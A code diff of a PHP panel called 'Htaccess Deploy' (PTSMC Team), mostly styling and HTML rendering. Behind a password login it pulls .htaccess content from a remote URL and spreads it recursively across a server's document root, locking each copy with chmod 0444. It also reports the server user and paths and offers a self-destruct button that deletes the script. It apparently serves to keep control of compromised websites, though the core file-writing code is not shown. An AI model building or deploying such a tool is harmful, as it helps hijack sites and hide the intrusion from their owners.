+.modal-body h3{font-size:18px;letter-spacing:1.5px;margin-bottom:12px;color:var(--fire-main);text-transform:uppercase;font-weight:900;}
+.modal-body p{color:var(--text-mute);font-size:14px;margin-bottom:28px;line-height:1.6}
+.modal-actions{display:flex;gap:12px}
+.modal-actions .btn{flex:1;letter-spacing:2px;padding:14px}
 
-        input[type="text"]:focus {
-            outline: none;
-            border-color: #ff0000;
-            box-shadow: 0 0 0 3px rgba(255, 0, 60, 0.15);
-            background: rgba(0, 0, 0, 0.8);
-        }
+.muted{color:var(--text-faint);font-size:11px;letter-spacing:1px;margin-top:16px;text-align:center;text-transform:uppercase;}
 
-        /* Animated Button */
-        button {
-            width: 100%;
-            padding: 20px;
-            margin-top: 10px;
-            background: linear-gradient(135deg, #ff0000 0%, #000000 100%);
-            border: none;
-            border-radius: 20px;
-            color: #fff;
-            font-family: 'JetBrains Mono', monospace;
-            font-weight: 800;
-            font-size: 1rem;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            cursor: pointer;
-            position: relative;
-            overflow: hidden;
-            transition: all 0.3s ease;
-            box-shadow: 0 10px 30px -10px rgba(255, 0, 60, 0.5);
-        }
-
-        button::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
-            transition: 0.5s;
-        }
-
-        button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 35px -5px rgba(255, 0, 60, 0.7);
-        }
-
-        button:hover::before {
-            left: 100%;
-        }
-
-        button:active {
-            transform: scale(0.98);
-        }
-
-        /* Stats Section */
-        .stats-container {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 15px;
-            margin-top: 2rem;
-            animation: fadeIn 0.8s ease 0.2s forwards;
-            opacity: 0;
-        }
-
-        .stat-card {
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 14px;
-            padding: 20px;
-            text-align: center;
-            transition: 0.3s;
-        }
-
-        .stat-card:hover {
-            border-color: #ff0000;
-            background: rgba(255, 0, 60, 0.05);
-        }
-
-        .stat-value {
-            font-size: 2.2rem;
-            font-weight: 800;
-            display: block;
-            margin-bottom: 5px;
-        }
-
-        .stat-label {
-            font-size: 0.7rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            opacity: 0.7;
-        }
-
-        .success .stat-value { color: #00ff88; text-shadow: 0 0 10px rgba(0, 255, 136, 0.3); }
-        .locked .stat-value { color: #ffbb00; text-shadow: 0 0 10px rgba(255, 187, 0, 0.3); }
-        .fail .stat-value { color: #ff0000; text-shadow: 0 0 10px #ff0000; }
-
-        /* Report / Log Section */
-        .log-container {
-            margin-top: 2rem;
-            background: #000;
-            border: 1px solid #222;
-            border-radius: 20px;
-            padding: 15px;
-            max-height: 350px;
-            overflow-y: auto;
-            opacity: 0;
-            animation: fadeIn 0.8s ease 0.4s forwards;
-        }
-
-        .log-header {
-            color: #ffbb00;
-            font-size: 0.85rem;
-            font-weight: bold;
-            margin-bottom: 10px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #222;
-            display: flex;
-            justify-content: space-between;
-        }
-
-        .log-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 8px 0;
-            border-bottom: 1px solid #111;
-            font-size: 0.8rem;
-            color: #888;
-        }
-        
-        .log-item:hover { color: #ccc; }
-        .log-item span.path { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; padding-right: 15px; }
-        .log-item span.status { color: #ffbb00; font-weight: bold; font-size: 0.7rem; background: rgba(255, 187, 0, 0.1); padding: 2px 6px; border-radius: 4px; }
-
-        /* Alerts */
-        .alert {
-            padding: 16px;
-            border-radius: 20px;
-            margin-bottom: 25px;
-            font-size: 0.9rem;
-            text-align: center;
-            border: 1px solid transparent;
-            animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-        
-        .alert.error { background: rgba(255, 0, 60, 0.1); border-color: #ff0000; color: #ff0000; }
-        .alert.warning { background: rgba(255, 187, 0, 0.1); border-color: #ffbb00; color: #ffbb00; }
-        .alert.success { background: rgba(0, 255, 136, 0.1); border-color: #00ff88; color: #00ff88; }
-
-        /* Scrollbar Styling */
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: #0a0a0a; }
-        ::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
-        ::-webkit-scrollbar-thumb:hover { background: #ff0000; }
-
-        /* Animations */
-        @keyframes slideIn { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        @keyframes popIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
-
-    </style>
+@media (max-width:600px){
+  .login-card{padding:40px 24px}
+  .brand-title{font-size:32px}
+  .card{padding:20px}
+  .topbar{padding:16px;flex-direction:column;gap:16px;}
+  .wrap{padding:12px}
+  .kill-zone{flex-direction:column;text-align:center;}
+}
+</style>
 </head>
 <body>
+<canvas id="particles"></canvas>
+<?php }
 
-<canvas id="matrix-bg"></canvas>
-
-<div class="container">
-    <div class="main-card">
-        <h1><span class="icon">☣</span> Htaccess Deploy <span style="font-size:0.5em; opacity:0.5; margin-left:auto;">V5.0</span></h1>
-        <p class="subtitle">Developed By PTSMC Team</p>
-
-        <?= $message ?>
-
-        <form method="POST">
-            <div class="form-group">
-                <label>SOURCE FILE PATH [.htaccess]</label>
-                <input type="text" name="source_file" value="<?= isset($_POST['source_file']) ? htmlspecialchars($_POST['source_file']) : $defaultSource ?>" required spellcheck="false">
-            </div>
-
-            <div class="form-group">
-                <label>TARGET DIRECTORY [ROOT]</label>
-                <input type="text" name="base_dir" value="<?= isset($_POST['base_dir']) ? htmlspecialchars($_POST['base_dir']) : $defaultBase ?>" required spellcheck="false">
-            </div>
-
-            <button type="submit" name="execute">Apply</button>
-        </form>
-
-        <?php if (isset($_POST['execute'])): ?>
-            <div class="stats-container">
-                <div class="stat-card success">
-                    <span class="stat-value count-up" data-target="<?= $stats['success'] ?>">0</span>
-                    <span class="stat-label">OVERWRITTEN</span>
-                </div>
-                <div class="stat-card locked">
-                    <span class="stat-value count-up" data-target="<?= $stats['locked'] ?>">0</span>
-                    <span class="stat-label">LOCKED (SKIPPED)</span>
-                </div>
-                <div class="stat-card fail">
-                    <span class="stat-value count-up" data-target="<?= $stats['fail'] ?>">0</span>
-                    <span class="stat-label">FAILED</span>
-                </div>
-            </div>
-
-            <?php if (!empty($report)): ?>
-                <div class="log-container">
-                    <div class="log-header">
-                        <span>⚠ LOCKED TARGETS DETECTED</span>
-                        <span>COUNT: <?= count($report) ?></span>
-                    </div>
-                    <?php foreach ($report as $log): ?>
-                        <div class="log-item">
-                            <span class="path"><?= $log['path'] ?></span>
-                            <span class="status">LOCKED 0444</span>
-                        </div>
-                    <?php endforeach; ?>
-                </div>
-            <?php endif; ?>
-        <?php endif; ?>
-
-    </div>
-</div>
-
+function render_foot() { ?>
 <script>
-    // RED MATRIX RAIN EFFECT
-    const canvas = document.getElementById('matrix-bg');
-    const ctx = canvas.getContext('2d');
+// ===== Realistic Fire Particle Background =====
+(function(){
+  const c = document.getElementById('particles');
+  if(!c) return;
+  const ctx = c.getContext('2d');
+  let w, h, parts = [];
+  function resize(){ w = c.width = innerWidth; h = c.height = innerHeight; }
+  resize(); addEventListener('resize', resize);
+  
+  const N = Math.min(200, Math.floor((w * h) / 12000)); // Dynamic particle count
+  
+  function createParticle() {
+    return {
+      x: Math.random() * w,
+      y: h + Math.random() * 100, // Spawn below screen
+      vx: (Math.random() - 0.5) * 1.5,
+      vy: -(Math.random() * 4 + 1.5), // Upward velocity (fire)
+      r: Math.random() * 4 + 2, // Radius
+      life: Math.random() * 100 + 50,
+      maxLife: 150,
+      hue: Math.random() * 30 + 10 // Orange to Red hues
+    };
+  }
 
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
+  for(let i=0; i<N; i++) parts.push(createParticle());
 
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
-    const charArray = chars.split('');
-    const fontSize = 14;
-    const columns = canvas.width / fontSize;
-    const drops = [];
+  function tick(){
+    // Trail effect
+    ctx.globalCompositeOperation = 'source-over';
+    ctx.fillStyle = 'rgba(5, 0, 0, 0.3)';
+    ctx.fillRect(0, 0, w, h);
+    
+    ctx.globalCompositeOperation = 'lighter'; // Additive blending for fire glow
 
-    for (let x = 0; x < columns; x++) {
-        drops[x] = 1;
+    for(let i=0; i<parts.length; i++){
+      let p = parts[i];
+      p.x += p.vx;
+      p.y += p.vy;
+      p.life--;
+      p.r = Math.max(0, p.r - 0.02); // Shrink over time
+
+      // Horizontal drift (wind effect)
+      p.vx += (Math.random() - 0.5) * 0.1;
+
+      if(p.life <= 0 || p.r <= 0 || p.y < -50){
+        parts[i] = createParticle();
+        parts[i].y = h + 10;
+      }
+
+      let alpha = Math.max(0, p.life / p.maxLife);
+      let color = `hsla(${p.hue}, 100%, 50%, ${alpha})`;
+      
+      ctx.beginPath();
+      ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+      ctx.fillStyle = color;
+      ctx.fill();
+
+      // Outer glow
+      ctx.beginPath();
+      ctx.arc(p.x, p.y, p.r * 2.5, 0, Math.PI * 2);
+      ctx.fillStyle = `hsla(${p.hue}, 100%, 50%, ${alpha * 0.2})`;
+      ctx.fill();
     }
+    requestAnimationFrame(tick);
+  }
+  tick();
+})();
 
-    function drawMatrix() {
-        ctx.fillStyle = 'rgba(5, 5, 5, 0.05)'; // Fade effect
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
+// ===== Copy buttons =====
+document.addEventListener('click',function(e){
+  const t=e.target.closest('.copy-btn');if(!t)return;
+  const text=t.getAttribute('data-copy')||'';
+  navigator.clipboard.writeText(text).then(()=>{
+    const orig=t.textContent;t.textContent='COPIED';t.classList.add('copied');
+    setTimeout(()=>{t.textContent=orig;t.classList.remove('copied')},1500);
+  }).catch(()=>{});
+});
 
-        ctx.font = fontSize + 'px monospace';
+// ===== Modal =====
+function showModal(id){document.getElementById(id).classList.add('show')}
+function hideModal(id){document.getElementById(id).classList.remove('show')}
+document.addEventListener('click',function(e){
+  if(e.target.classList && e.target.classList.contains('modal'))e.target.classList.remove('show');
+});
+document.addEventListener('keydown',function(e){
+  if(e.key==='Escape')document.querySelectorAll('.modal.show').forEach(m=>m.classList.remove('show'));
+});
+window.showModal=showModal;window.hideModal=hideModal;
 
-        for (let i = 0; i < drops.length; i++) {
-            const text = charArray[Math.floor(Math.random() * charArray.length)];
-            
-            // Randomize Red Shades
-            const isBright = Math.random() > 0.9;
-            ctx.fillStyle = isBright ? '#ff003c' : '#80001e'; // Bright Red or Dark Red
-
-            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-
-            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-                drops[i] = 0;
-            }
-            drops[i]++;
-        }
-    }
-
-    setInterval(drawMatrix, 40);
-
-    window.addEventListener('resize', () => {
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-    });
-
-    // NUMBER COUNTER ANIMATION
-    document.querySelectorAll('.count-up').forEach(el => {
-        const target = parseInt(el.getAttribute('data-target'));
-        if(target === 0) return;
-        
-        const duration = 1500;
-        const start = 0;
-        const startTime = performance.now();
-
-        function update(currentTime) {
-            const elapsed = currentTime - startTime;
-            const progress = Math.min(elapsed / duration, 1);
-            
-            // EaseOutExpo function
-            const ease = progress === 1 ? 1 : 1 - Math.pow(2, -10 * progress);
-            
-            el.innerText = Math.floor(start + (target - start) * ease);
-
-            if (progress < 1) {
-                requestAnimationFrame(update);
-            } else {
-                el.innerText = target;
-            }
-        }
-        requestAnimationFrame(update);
-    });
+// ===== Form auto-disable on submit =====
+document.querySelectorAll('form[data-loading]').forEach(f=>{
+  f.addEventListener('submit',function(){
+    const b=f.querySelector('button[type=submit]');
+    if(b){b.disabled=true;b.style.opacity=.7;b.textContent='PROCESSING...'}
+  });
+});
 </script>
-
 </body>
 </html>
+<?php }
+
+function render_login($flash) {
+    render_head('Login');
+    ?>
+    <div class="login-wrap">
+      <div class="login-card">
+        <div class="brand">
+          <div class="brand-title"><?= h(PTSMC_BRAND) ?></div>
+          <div class="brand-tag"><?= h(PTSMC_TAGLINE) ?></div>
+        </div>
+        <?php if ($flash): ?>
+          <div class="flash <?= h($flash['type'] ?? '') ?>"><?= h($flash['msg']) ?></div>
+        <?php endif; ?>
+        <form method="post" data-loading>
+          <input type="hidden" name="action" value="login">
+          <div class="field">
+            <input type="password" name="password" class="input" placeholder="ENTER SECURE PASSWORD" required autofocus>
+          </div>
+          <button type="submit" class="btn">AUTHENTICATE</button>
+        </form>
+        <div class="muted">Restricted Area</div>
+      </div>
+    </div>
+    <?php
+    render_foot();
+}
+
+function render_dashboard($results, $flash) {
+    $csrf       = $_SESSION['csrf'];
+    $lastSource = $_SESSION['last_source_url']  ?? PTSMC_DEFAULT_SOURCE_URL;
+    $lastTarget = $_SESSION['last_target_path'] ?? ($_SERVER['DOCUMENT_ROOT'] ?? '');
+    $lastSkip   = $_SESSION['last_skip_dirs']   ?? PTSMC_DEFAULT_SKIP_DIRS;
+
+    render_head('Dashboard');
+    ?>
+    <div class="wrap">
+      <div class="container">
+
+        <div class="topbar">
+          <div class="topbar-brand">
+            <div class="topbar-logo">P</div>
+            <div>
+              <div class="topbar-title"><?= h(PTSMC_BRAND) ?></div>
+              <div class="topbar-sub"><?= h(PTSMC_TAGLINE) ?></div>
+            </div>
+          </div>
+          <form method="post" style="margin:0">
+            <input type="hidden" name="action" value="logout">
+            <button class="btn btn-ghost btn-sm" type="submit">LOGOUT</button>
+          </form>
+        </div>
+
+        <?php if ($flash): ?>
+          <div class="flash <?= h($flash['type'] ?? '') ?>"><?= h($flash['msg']) ?></div>
+        <?php endif; ?>
+
+        <div class="grid-2">
+
+          <!-- DEPLOY FORM -->
+          <div class="card">
+            <div class="card-title"><span class="dot"></span>Deployment Core</div>
+
+            <form method="post" data-loading>
+              <input type="hidden" name="action" value="deploy">
+              <input type="hidden" name="csrf"   value="<?= h($csrf) ?>">
+
+              <div class="field">
+                <label class="label">Source URL (.htaccess content)</label>
+                <input type="url" name="source_url" class="input"
+                       placeholder="https://your-domain.com/master_htaccess.txt"
+                       value="<?= h($lastSource) ?>" required>
+              </div>
+
+              <div class="field">
+                <label class="label">Target Path (Root Deployment)</label>
+                <input type="text" name="target_path" class="input"
+                       placeholder="/home/user/public_html"
+                       value="<?= h($lastTarget) ?>" required>
+              </div>
+
+              <div class="field">
+                <label class="label">Skip Folders (Comma Separated)</label>
+                <input type="text" name="skip_dirs" class="input"
+                       value="<?= h($lastSkip) ?>">
+              </div>
+
+              <div class="field" style="margin-top:24px; margin-bottom:28px;">
+                <label class="checkbox">
+                  <input type="checkbox" name="dry_run" value="1">
+                  <span>Dry Run (Simulasi saja, tidak menulis file)</span>
+                </label>
+              </div>
+
+              <button type="submit" class="btn">EXECUTE DEPLOYMENT</button>
+            </form>
+          </div>
+
+          <!-- INFO / STATUS PANEL -->
+          <div class="card">
+            <div class="card-title"><span class="dot"></span>System Info</div>
+            <div style="font-size:13px;color:var(--text-mute);line-height:1.7">
+              Script ini menyebar <b style="color:#fff">.htaccess</b> secara rekursif.<br><br>
+              • Folder yang memiliki <b style="color:#fff">.htaccess mode 0444</b> otomatis <b style="color:var(--green)">DI-SKIP</b>.<br>
+              • Output console success disembunyikan. <b>Hanya menampilkan target yang gagal/skip.</b><br>
+              • Hasil deploy otomatis dilock <b style="color:#fff">chmod 0444</b>.<br><br>
+              <div style="background:rgba(0,0,0,.4);padding:12px;border-radius:10px;border:1px solid var(--input-border);margin-top:10px;">
+                <span style="color:var(--text-faint);font-size:11.5px;word-break:break-all;">
+                  User: <b style="color:#fff"><?= h(function_exists('posix_getpwuid') ? (posix_getpwuid(posix_geteuid())['name'] ?? '?') : get_current_user()) ?></b><br>
+                  Root: <code><?= h($_SERVER['DOCUMENT_ROOT'] ?? '') ?></code><br>
+                  Path: <code><?= h(__FILE__) ?></code>
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <?php if ($results !== null): ?>
+          <?php render_results($results); ?>
+        <?php endif; ?>
+
+        <!-- KILL ZONE -->
+        <div class="kill-zone">
+          <div class="kill-zone-info">
+            <h4>Kill Switch / Self Destruct</h4>
+            <p>Hapus script ini dari server secara permanen setelah tugas selesai untuk keamanan.</p>
+          </div>
+          <button class="btn btn-danger btn-sm" onclick="showModal('kill-modal')" style="letter-spacing:2px;padding:12px 24px">DESTROY SCRIPT</button>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- Kill self modal -->
+    <div class="modal" id="kill-modal">
+      <div class="modal-body">
+        <h3>Confirm Destruct</h3>
+        <p>File <code style="background:rgba(0,0,0,.5);padding:4px 8px;border-radius:6px;font-size:12px;color:#fff;"><?= h(basename(__FILE__)) ?></code> akan dihapus permanen. Yakin?</p>
+        <form method="post" style="margin:0">
+          <input type="hidden" name="action" value="kill_self">
+          <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
+          <div class="modal-actions">
+            <button type="button" class="btn btn-ghost" onclick="hideModal('kill-modal')">CANCEL</button>
+            <button type="submit" class="btn btn-danger">CONFIRM DELETE</button>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <?php
+    render_foot();
+}
+
+function render_results($r) {
+    $s = $r['stats'];
+    ?>
+    <div class="card" style="border-color:var(--fire-main); box-shadow:0 0 30px rgba(255,60,0,.15);">
+      <div class="card-title"><span class="dot"></span>Deployment Result · <?= h($r['started_at']) ?> · <?= h($r['duration']) ?>s</div>
+
+      <?php if (!$r['success']): ?>
+        <div class="flash" style="background:rgba(255,0,0,.2); border-color:var(--fire-main); color:#fff; font-weight:bold;">
+          FATAL: <?= h($r['message']) ?>
+        </div>
+      <?php else: ?>
+        <div class="summary">
+          <span>Source: <b><?= h($r['source_url']) ?></b></span>
+          <span>· Size: <b><?= h($r['size_bytes']) ?> B</b></span>
+          <span>· Target: <b><?= h($r['target_path']) ?></b></span>
+          <span>· Mode:
+            <?php if ($r['dry_run']): ?><span class="badge dry">DRY RUN</span><?php else: ?><span class="badge live">LIVE</span><?php endif; ?>
+          </span>
+        </div>
+
+        <div class="stats">
+          <div class="stat dirs"><div class="stat-num"><?= (int)$s['dirs_scanned'] ?></div><div class="stat-label">Scanned</div></div>
+          <div class="stat new"><div class="stat-num"><?= (int)$s['new'] ?></div><div class="stat-label">New</div></div>
+          <div class="stat over"><div class="stat-num"><?= (int)$s['overwritten'] ?></div><div class="stat-label">Overwrite</div></div>
+          <div class="stat skip"><div class="stat-num"><?= (int)$s['skipped_locked'] ?></div><div class="stat-label">Locked Skip</div></div>
+          <div class="stat err"><div class="stat-num"><?= (int)$s['errors'] ?></div><div class="stat-label">Errors</div></div>
+          <div class="stat perm"><div class="stat-num"><?= (int)$s['perm_denied'] ?></div><div class="stat-label">Perm Denied</div></div>
+        </div>
+      <?php endif; ?>
+    </div>
+
+    <?php if ($r['success']): ?>
+      
+      <?php if (!empty($r['skipped_locked'])): ?>
+      <div class="card">
+        <div class="section-head">
+          <h3>Skipped Directories (Locked 0444)</h3>
+          <span class="count-pill grey"><?= count($r['skipped_locked']) ?></span>
+        </div>
+        <div style="font-size:12px;color:var(--text-mute);margin-bottom:16px;">
+          Menampilkan path yang tidak direplace karena terdapat .htaccess bermode 444.
+        </div>
+        <div>
+          <?php foreach ($r['skipped_locked'] as $sp): ?>
+            <div class="list-item skip">
+              <div class="meta">
+                <div class="path"><?= h($sp) ?></div>
+                <div class="why">SKIPPED · Htaccess exist and locked (0444)</div>
+              </div>
+            </div>
+          <?php endforeach; ?>
+        </div>
+      </div>
+      <?php endif; ?>
+
+      <?php if (!empty($r['errors'])): ?>
+      <div class="card">
+        <div class="section-head">
+          <h3>Failed Paths (Write Errors)</h3>
+          <span class="count-pill red"><?= count($r['errors']) ?></span>
+        </div>
+        <?php foreach ($r['errors'] as $e): ?>
+          <div class="list-item error">
+            <div class="meta">
+              <div class="path"><?= h($e['path']) ?></div>
+              <div class="why">✗ <?= h($e['reason']) ?><?= !empty($e['parent_mode']) ? ' · FOLDER MODE '.h($e['parent_mode']) : '' ?></div>
+              <?php if (!empty($e['fix_cmd'])): ?>
+                <div class="fix">
+                  <code><?= h($e['fix_cmd']) ?></code>
+                  <button type="button" class="copy-btn" data-copy="<?= h($e['fix_cmd']) ?>">COPY</button>
+                </div>
+              <?php endif; ?>
+            </div>
+          </div>
+        <?php endforeach; ?>
+      </div>
+      <?php endif; ?>
+
+      <?php if (!empty($r['permission_denied'])): ?>
+      <div class="card">
+        <div class="section-head">
+          <h3>Permission Denied Folders</h3>
+          <span class="count-pill orange"><?= count($r['permission_denied']) ?></span>
+        </div>
+        <div style="font-size:12px;color:var(--text-mute);margin-bottom:16px;">
+          Folder restriktif. Perbaiki permission secara manual lalu jalankan deploy ulang.
+        </div>
+        <?php foreach ($r['permission_denied'] as $p): ?>
+          <div class="list-item perm">
+            <div class="meta">
+              <div class="path"><?= h($p['path']) ?></div>
+              <div class="why">⚠ MODE <?= h($p['mode']) ?> · <?= h($p['reason']) ?></div>
+              <?php if (!empty($p['fix_cmd'])): ?>
+                <div class="fix">
+                  <code><?= h($p['fix_cmd']) ?></code>
+                  <button type="button" class="copy-btn" data-copy="<?= h($p['fix_cmd']) ?>">COPY</button>
+                </div>
+              <?php endif; ?>
+            </div>
+          </div>
+        <?php endforeach; ?>
+      </div>
+      <?php endif; ?>
+
+    <?php endif; ?>
+    <?php
+}
+
+function render_kill_self($killed) {
+    render_head('System Destruct');
+    ?>
+    <div class="login-wrap">
+      <div class="login-card" style="text-align:center">
+        <div class="brand">
+          <div class="brand-title" style="font-size:32px; color:var(--fire-main);"><?= $killed ? 'SCRIPT DESTROYED' : 'DESTROY FAILED' ?></div>
+          <div class="brand-tag"><?= h(PTSMC_TAGLINE) ?></div>
+        </div>
+        <div style="color:var(--text-mute);font-size:14px;line-height:1.7;margin-bottom:20px">
+        <?php if ($killed): ?>
+          File script telah dihanguskan dari server secara permanen.<br>Sistem sekarang aman.
+        <?php else: ?>
+          Gagal menghapus <code style="background:rgba(0,0,0,.5);padding:4px 8px;border-radius:6px;font-size:12px;color:#fff;"><?= h(basename(__FILE__)) ?></code>.<br>
+          Hapus manual melalui file manager / terminal.
+        <?php endif; ?>
+        </div>
+      </div>
+    </div>
+    <?php
+    render_foot();
+}
